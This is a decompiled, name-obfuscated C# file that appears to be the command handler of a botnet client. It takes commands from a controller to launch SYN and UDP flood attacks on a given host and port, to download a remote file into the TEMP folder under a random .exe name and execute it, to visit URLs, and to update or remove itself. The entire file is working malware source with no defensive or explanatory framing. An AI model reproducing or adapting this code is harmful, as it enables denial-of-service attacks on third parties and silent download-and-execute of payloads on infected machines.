using System;
using System.Diagnostics;
using System.Net;
using ns3;
using ns4;

namespace ns2;

internal class Class10
{
	public static void smethod_0(string string_0)
	{
		string[] array = new string[0];
		array = string_0.Split(new char[1] { '*' });
		switch (array[0])
		{
		case "synflood":
			try
			{
				Class21.string_0 = Convert.ToString(array[1]);
				Class21.ushort_0 = ushort.Parse(array[2]);
				Class21.int_1 = Convert.ToInt32(array[3]);
				Class21.int_0 = Convert.ToInt32(array[4]);
				Class21.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case "udpflood":
			try
			{
				Class18.string_0 = Convert.ToString(array[1]);
				Class18.ushort_0 = ushort.Parse(array[2]);
				Class18.int_1 = Convert.ToInt32(array[3]);
				Class18.int_2 = Convert.ToInt32(array[4]);
				Class18.int_0 = Convert.ToInt32(array[5]);
				Class18.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case "download":
			smethod_1(Convert.ToString(array[1]));
			break;
		case "visit":
			smethod_2(Convert.ToString(array[1]));
			break;
		case "update":
			Class16.smethod_2(Convert.ToString(array[1]));
			break;
		case "remove":
			if (array[1] == Class15.string_4 || array[1].ToUpper() == "ALL")
			{
				Class16.smethod_3();
			}
			break;
		}
	}

	private static void smethod_1(string string_0)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = Class13.smethod_3(new Random().Next(5, 12)) + ".exe";
			string fileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			if (!string_0.StartsWith("http://"))
			{
				string_0 = "http://" + string_0;
			}
			webClient.DownloadFile(string_0, fileName);
			Process.Start(fileName);
			webClient.Dispose();
		}
		catch
		{
		}
	}

	private static void smethod_2(string string_0)
	{
		try
		{
			if (!string_0.StartsWith("http://"))
			{
				string_0 = "http://" + string_0;
			}
			WebClient webClient = new WebClient();
			webClient.OpenRead(string_0);
			webClient.Dispose();
		}
		catch
		{
		}
	}
}
